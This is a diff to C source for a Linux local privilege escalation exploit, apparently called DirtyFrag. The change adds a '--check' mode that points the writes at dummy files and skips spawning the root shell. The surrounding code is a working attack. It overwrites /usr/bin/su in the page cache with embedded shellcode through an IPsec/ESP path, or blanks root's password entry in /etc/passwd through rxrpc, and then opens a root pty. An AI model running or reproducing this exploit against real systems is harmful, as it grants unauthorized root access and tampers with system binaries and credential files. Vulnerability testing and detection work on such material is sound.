@@ -34,7 +34,6 @@
 #define ENC_PORT         4500
 #define SEQ_VAL          200
 #define REPLAY_SEQ       100
-#define TARGET_PATH      "/usr/bin/su"
 #define PATCH_OFFSET     0              /* overwrite whole ELF starting at file[0] */
 #define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48 triggers) */
 #define ENTRY_OFFSET     0x78           /* shellcode entry inside the new ELF */
@@ -89,6 +88,24 @@ static const uint8_t shell_elf[PAYLOAD_LEN] = {
 extern int g_su_verbose;
 int g_su_verbose = 0;
 #define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)
+#define LOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)
+extern int g_check_only;
+int g_check_only = 0;
+
+void write_testfile(const char *path, const char *content, int length)
+{
+    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
+    if(fd == -1) {
+        LOG("open: %s", strerror(errno));
+        exit(1);
+    }
+    int ret = write(fd, content, length);
+    if(ret != length) {
+        LOG("write: %s", strerror(errno));
+        exit(1);
+    }
+    close(fd);
+}
 
 static int write_proc(const char *path, const char *buf)
 {
@@ -288,7 +305,7 @@ static int verify_byte(const char *path, off_t offset, uint8_t want)
 	return got == want ? 0 : -1;
 }
 
-static int corrupt_su(void)
+static int corrupt_su(const char *su_target_path)
 {
 	setup_userns_netns();
 	usleep(100 * 1000);
@@ -312,13 +329,13 @@ static int corrupt_su(void)
 	for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
 		uint32_t spi = 0xDEADBE10 + i;
 		off_t off = PATCH_OFFSET + i * 4;
-		if (do_one_write(TARGET_PATH, off, spi) < 0) {
+		if (do_one_write(su_target_path, off, spi) < 0) {
 			SLOG("do_one_write #%d at off=0x%lx failed", i, (long)off);
 			return -1;
 		}
 	}
 	SLOG("wrote %d bytes to %s starting at 0x%x",
-			PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
+			PAYLOAD_LEN, su_target_path, PATCH_OFFSET);
 	return 0;
 }
 
@@ -331,11 +348,22 @@ int su_lpe_main(int argc, char **argv)
 			; /* compat: this body always corrupts only */
 	}
 	if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;
+	if (getenv("DIRTYFRAG_CHECKONLY")) g_check_only = 1;
+
+    const char *su_target_path = getenv("POC_SU_TARGET_FILE");
+    if (!su_target_path || !*su_target_path) su_target_path = "/usr/bin/su";
+
+    // write test file
+    if(g_check_only) {
+        char a[PAYLOAD_LEN+20];
+        memset(a, 'A', sizeof(a));
+        write_testfile(su_target_path, a, sizeof(a));
+    }
 
 	pid_t cpid = fork();
 	if (cpid < 0) return 1;
 	if (cpid == 0) {
-		int rc = corrupt_su();
+		int rc = corrupt_su(su_target_path);
 		_exit(rc == 0 ? 0 : 2);
 	}
 	int cstatus;
@@ -348,13 +376,13 @@ int su_lpe_main(int argc, char **argv)
 	/* Sanity check: bytes at the embedded ELF entry (file offset 0x78
 	 * after our overwrite) should be 0x31 0xff (xor edi, edi — first
 	 * instruction of the new shellcode). */
-	if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||
-			verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
+	if (verify_byte(su_target_path, ENTRY_OFFSET, 0x31) != 0 ||
+			verify_byte(su_target_path, ENTRY_OFFSET + 1, 0xff) != 0) {
 		SLOG("post-write verify failed (target unchanged)");
 		return 1;
 	}
-	SLOG("/usr/bin/su page-cache patched (entry 0x%x = shellcode)",
-			ENTRY_OFFSET);
+	SLOG("%s page-cache patched (entry 0x%x = shellcode)",
+			su_target_path, ENTRY_OFFSET);
 	return 0;
 }
 /*
@@ -449,6 +477,7 @@ static uint8_t SESSION_KEY[8] = {
 	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
 };
 
+#undef LOG
 #define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
 #define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
 #define DBG(fmt, ...) fprintf(stderr, "[.] " fmt "\n", ##__VA_ARGS__)
@@ -1241,6 +1270,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 			}
 		}
 	}
+	if (getenv("DIRTYFRAG_CHECKONLY")) g_check_only = 1;
 
 	/* Open a dummy AF_RXRPC socket to autoload the rxrpc kernel module.
 	 * Without this, the first add_key("rxrpc", ...) call fails with ENODEV
@@ -1260,6 +1290,12 @@ int rxrpc_lpe_main(int argc, char **argv)
 	 * root entry on line 1). */
 	const char *target_path = getenv("POC_TARGET_FILE");
 	if (!target_path || !*target_path) target_path = "/etc/passwd";
+
+    // write test file
+    if(g_check_only) {
+        const char *passwdstr = "root:x:0:0:root:/root:/bin/bash\n\n";
+        write_testfile(target_path, passwdstr, strlen(passwdstr));
+    }
 
 	int rfd_ro = open(target_path, O_RDONLY);
 	if (rfd_ro < 0) {
@@ -1287,15 +1323,15 @@ int rxrpc_lpe_main(int argc, char **argv)
 	{
 		const char *m = (const char *)map;
 		if (memcmp(m, "root::0:0", 9) == 0) {
-			LOG("/etc/passwd already patched (root::0:0...) — nothing to do");
+			LOG("%s already patched (root::0:0...) — nothing to do", target_path);
 			return 0;
 		}
-		LOG("/etc/passwd line 1 first 16 bytes:");
+		LOG("%s line 1 first 16 bytes:", target_path);
 		for (int i = 0; i < 16; i++)
 			fprintf(stderr, "%02x ", (uint8_t)m[i]);
 		fprintf(stderr, "\n");
 	}
-	fprintf(stderr, "[*] /etc/passwd line 1 (root entry) BEFORE: '");
+	fprintf(stderr, "[*] %s line 1 (root entry) BEFORE: '", target_path);
 	for (int i = 0; i < 32; i++) {
 		char c = ((const char *)map)[i];
 		fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
@@ -1408,7 +1444,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 		}
 	}
 
-	fprintf(stderr, "\n[+] Predicted post-corruption /etc/passwd line 1:\n    \"root");
+	fprintf(stderr, "\n[+] Predicted post-corruption %s line 1:\n    \"root", target_path);
 	/* chars 4-5 from P_A */
 	for (int i = 0; i < 2; i++) fputc((Pa_out[i]>=32&&Pa_out[i]<127)?Pa_out[i]:'.', stderr);
 	/* chars 6-7 from P_B */
@@ -1441,7 +1477,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 	}
 
 	/* Verify: re-read line 1 of /etc/passwd via mmap. */
-	fprintf(stderr, "[*] /etc/passwd line 1 (root entry) AFTER:  '");
+	fprintf(stderr, "[*] %s line 1 (root entry) AFTER:  '", target_path);
 	for (int i = 0; i < 32; i++) {
 		char c = ((const char *)map)[i];
 		fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
@@ -1693,9 +1729,9 @@ static const uint8_t su_marker[8] = {
 	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
 };
 
-static int su_already_patched(void)
+static int su_already_patched(const char *su_target_path)
 {
-	int fd = open("/usr/bin/su", O_RDONLY);
+	int fd = open(su_target_path, O_RDONLY);
 	if (fd < 0)
 		return 0;
 	uint8_t got[8];
@@ -1706,9 +1742,9 @@ static int su_already_patched(void)
 	return memcmp(got, su_marker, sizeof(su_marker)) == 0;
 }
 
-static int passwd_already_patched(void)
+static int passwd_already_patched(const char *target_path)
 {
-	int fd = open("/etc/passwd", O_RDONLY);
+	int fd = open(target_path, O_RDONLY);
 	if (fd < 0)
 		return 0;
 	char head[16];
@@ -1719,9 +1755,9 @@ static int passwd_already_patched(void)
 	return memcmp(head, "root::0:0", 9) == 0;
 }
 
-static int either_target_patched(void)
+static int either_target_patched(const char *target_path, const char *su_target_path)
 {
-	return su_already_patched() || passwd_already_patched();
+	return su_already_patched(su_target_path) || passwd_already_patched(target_path);
 }
 
 static void silence_stderr(int *saved_fd)
@@ -1892,14 +1928,46 @@ static int run_root_pty(void)
 	return 0;
 }
 
+void setenv_(const char *name, const char *value, int overwrite)
+{
+    int ret = setenv(name, value, overwrite);
+    if(ret == -1) {
+        LOG("setenv: %s", strerror(errno));
+        exit(1);
+    }
+}
+
 int main(int argc, char **argv)
 {
+    int check_only = (getenv("DIRTYFRAG_CHECKONLY") != NULL);
+    for (int i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "--check"))
+            check_only = 1;
+    }
+
+    if(check_only) {
+        setenv_("DIRTYFRAG_CHECKONLY", "1", 1);
+        setenv_("DIRTYFRAG_CORRUPT_ONLY", "1", 1);
+
+        const char *dirtyfrag_passwd = "dirtyfrag_passwd";
+        const char *dirtyfrag_su = "dirtyfrag_su";
+        setenv_("POC_TARGET_FILE", dirtyfrag_passwd, 1);
+        setenv_("POC_SU_TARGET_FILE", dirtyfrag_su, 1);
+    }
+
 	int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
+    int co_flag = (getenv("DIRTYFRAG_CORRUPT_ONLY") != NULL);
 	int force_esp = 0, force_rxrpc = 0;
 	int saved_err = -1;
 	int rc = 1;
 	int new_argc;
 	char **co_argv;
+
+
+    const char *target_path = getenv("POC_TARGET_FILE");
+    if (!target_path || !*target_path) target_path = "/etc/passwd";
+    const char *su_target_path = getenv("POC_SU_TARGET_FILE");
+    if (!su_target_path || !*su_target_path) su_target_path = "/usr/bin/su";
 
 	for (int i = 1; i < argc; i++) {
 		if (!strcmp(argv[i], "--force-esp"))
@@ -1923,26 +1991,28 @@ int main(int argc, char **argv)
 
 	if (force_rxrpc) {
 		rc = rxrpc_lpe_main(new_argc, co_argv);
-		for (int i = 0; !passwd_already_patched() && i < 3; i++)
+		for (int i = 0; !passwd_already_patched(target_path) && i < 3; i++)
 			rc = rxrpc_lpe_main(new_argc, co_argv);
 	} else if (force_esp) {
 		rc = su_lpe_main(new_argc, co_argv);
 	} else {
 		rc = su_lpe_main(new_argc, co_argv);
-		if (!su_already_patched()) {
+		if (!su_already_patched(su_target_path)) {
 			rc = rxrpc_lpe_main(new_argc, co_argv);
-			for (int i = 0; !passwd_already_patched() && i < 3; i++)
+			for (int i = 0; !passwd_already_patched(target_path) && i < 3; i++)
 				rc = rxrpc_lpe_main(new_argc, co_argv);
 		}
 	}
 
-	int patched = either_target_patched();
+	int patched = either_target_patched(target_path, su_target_path);
 
 	if (!verbose)
 		restore_stderr(saved_err);
 
 	if (patched) {
-		(void)run_root_pty();
+        if(!co_flag) {
+            (void)run_root_pty();
+        }
 		return 0;
 	}
 
